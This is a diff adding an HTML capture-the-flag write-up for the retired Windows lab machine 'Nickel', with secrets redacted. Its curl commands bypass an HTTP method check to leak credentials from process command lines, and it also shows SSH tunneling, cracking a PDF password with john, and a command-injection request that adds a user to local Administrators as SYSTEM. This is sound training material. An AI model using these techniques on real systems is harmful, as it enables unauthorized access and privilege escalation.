@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nickel &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Nickel</h1>
+    <div class="meta">Target: <code>192.168.176.99</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">HTTPVerbTampering</span><span class="tag">ProcessDump</span><span class="tag">Base64</span><span class="tag">SSHTunnel</span><span class="tag">PDFCrack</span><span class="tag">CommandInjection</span><span class="tag">LocalAdminAdd</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#port-8089-devops-dashboard">Port 8089, DevOps Dashboard</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#http-verb-tampering-process-list-disclosure">HTTP Verb Tampering, Process List Disclosure</a><a class="lvl3" href="#decrypting-the-pdf-internal-api-discovery">Decrypting the PDF, Internal API Discovery</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#internal-system-command-endpoint">Internal SYSTEM Command Endpoint</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Nickel is a Windows machine where the foothold comes from abusing a misconfigured internal DevOps API that leaks running process command lines, including a plaintext base64-encoded password in a process argument. That credential yields SSH access, and from there the path to SYSTEM routes through an internal web service that executes commands as <code>NT AUTHORITY\SYSTEM</code>, used to add the low-privilege user directly to the local Administrators group.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           FileZilla ftpd
+22/tcp   open  ssh           OpenSSH for_Windows_8.1
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8089/tcp open  http          Microsoft HTTPAPI httpd 2.0
+</code></pre>
+<p>Port 8089 stood out, an HTTPAPI endpoint without an obvious label. Port 80 returned no title.</p>
+<h3 id="port-8089-devops-dashboard">Port 8089, DevOps Dashboard</h3>
+<p>Browsing to port 8089 revealed a "DevOps Dashboard" with three buttons: List Current Deployments, List Running Processes, and List Active Nodes. All three hung when clicked.</p>
+<p>Checking the page source explained why:</p>
+<pre><code class="language-html">&lt;form action='http://169.254.129.94:33333/list-running-procs' method='GET'&gt;
+</code></pre>
+<p>The buttons submitted requests to an APIPA address (169.254.x.x) on port 33333, a link-local address unreachable from the internet. The endpoints actually exist on the real machine IP, port 33333.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="http-verb-tampering-process-list-disclosure">HTTP Verb Tampering, Process List Disclosure</h3>
+<p>Querying the endpoint directly with GET returned a 403:</p>
+<pre><code class="language-sh">curl -X GET http://192.168.176.99:33333/list-running-procs
+&lt;p&gt;Cannot &quot;GET&quot; /list-running-procs&lt;/p&gt;
+</code></pre>
+<p>Switching to POST without a body returned a 411 (Length Required):</p>
+<pre><code class="language-sh">curl -X POST http://192.168.176.99:33333/list-running-procs
+HTTP Error 411. The request must be chunked or have a content length.
+</code></pre>
+<p>Adding <code>Content-Length: 0</code> satisfied the requirement and returned the full running process list:</p>
+<pre><code class="language-sh">curl -X POST http://192.168.176.99:33333/list-running-procs -H 'Content-Length: 0'
+</code></pre>
+<p>One process line in the output contained credentials:</p>
+<pre><code>name        : cmd.exe
+commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml
+              --user ariah -p &quot;‹redacted›&quot; --server nickel-dev
+              --protocol ssh
+</code></pre>
+<blockquote>
+<p><strong>Why process command lines leak secrets:</strong> on Windows, <code>commandline</code> arguments passed to processes are visible to any user who can enumerate processes. Scripts and scheduled tasks often pass credentials as arguments for convenience, and those arguments sit in plain view in the process list. An attacker who can read the running process table gets those secrets for free.</p>
+</blockquote>
+<p>Decoding the base64 argument:</p>
+<pre><code class="language-sh">echo '‹redacted›' | base64 -d
+‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>ariah : ‹redacted›
+</code></pre>
+<p>SSH access:</p>
+<pre><code>Microsoft Windows [Version 10.0.18362.1016]
+ariah@NICKEL C:\Users\ariah&gt;
+</code></pre>
+<h3 id="decrypting-the-pdf-internal-api-discovery">Decrypting the PDF, Internal API Discovery</h3>
+<p>Port 80 was not externally reachable, but from the SSH session it was accessible locally. An SSH port-forward tunneled it to Kali:</p>
+<pre><code class="language-sh">ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.176.99
+</code></pre>
+<p>Browsing <code>127.0.0.1:8080</code> showed: <code>dev-api started at 2024-02-17T05:47:37</code>.</p>
+<p>The FTP server at port 21 had an <code>/ftp</code> directory containing <code>Infrastructure.pdf</code>, which was password-protected. Using <code>pdf2john</code> and rockyou:</p>
+<pre><code class="language-sh">pdf2john Infrastructure.pdf &gt; pdf.john
+john pdf.john --wordlist=/usr/share/wordlists/rockyou.txt
+ariah4168         (Infrastructure.pdf)
+</code></pre>
+<p>The PDF content:</p>
+<pre><code>Infrastructure Notes
+Temporary Command endpoint: http://nickel/?
+Backup system: http://nickel-backup/backup
+NAS: http://corp-nas/files
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="internal-system-command-endpoint">Internal SYSTEM Command Endpoint</h3>
+<p>The "Temporary Command endpoint" note was literal. Testing it via the SSH tunnel:</p>
+<pre><code>http://127.0.0.1:8080/?whoami
+</code></pre>
+<p>Response:</p>
+<pre><code>dev-api started at 2024-02-17T05:47:37
+nt authority\system
+</code></pre>
+<blockquote>
+<p><strong>What makes this escalation clean:</strong> the internal HTTP service executes whatever is passed in the query string as an OS command and runs as <code>NT AUTHORITY\SYSTEM</code>. No shell needed, just URL-encoded PowerShell. Rather than dropping a reverse shell (which would require additional tooling on the target), the winning move was to use the command endpoint to add the current user directly to the local Administrators group.</p>
+</blockquote>
+<p>Adding <code>ariah</code> to Administrators via the SYSTEM API endpoint:</p>
+<pre><code class="language-sh">curl 'http://localhost:8080/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'
+</code></pre>
+<p>After reconnecting via SSH, <code>whoami /priv</code> showed the full administrator privilege set, including <code>SeDebugPrivilege</code>, <code>SeBackupPrivilege</code>, and <code>SeImpersonatePrivilege</code>.</p>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>With ariah now in the local Administrators group, the proof flag was readable directly:</p>
+<pre><code class="language-powershell">ariah@NICKEL C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>HTTP verb tampering is a quick win before reaching for heavy tools.</strong> A GET-blocked endpoint that accepts POST with <code>Content-Length: 0</code> is indistinguishable from a GET to the application logic, but the server's method check gates access. One header change bypassed the restriction entirely.</li>
+<li><strong>Command-line arguments are plaintext secrets.</strong> Any credential passed as a <code>--password</code> or <code>-p</code> argument is readable from the process table. Scheduled tasks, deployment scripts, and dev tooling are the most common offenders.</li>
+<li><strong>SSH port-forwarding reaches internal-only services.</strong> Once you have SSH creds, <code>-L</code> tunneling makes any localhost-bound service on the target reachable from Kali. This unlocked both the internal API and the FTP PDF.</li>
+<li><strong>A SYSTEM-level command endpoint is faster than a shell.</strong> Instead of dropping a payload and catching a callback, a single <code>curl</code> call with a URL-encoded PowerShell command added the user to Administrators permanently.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
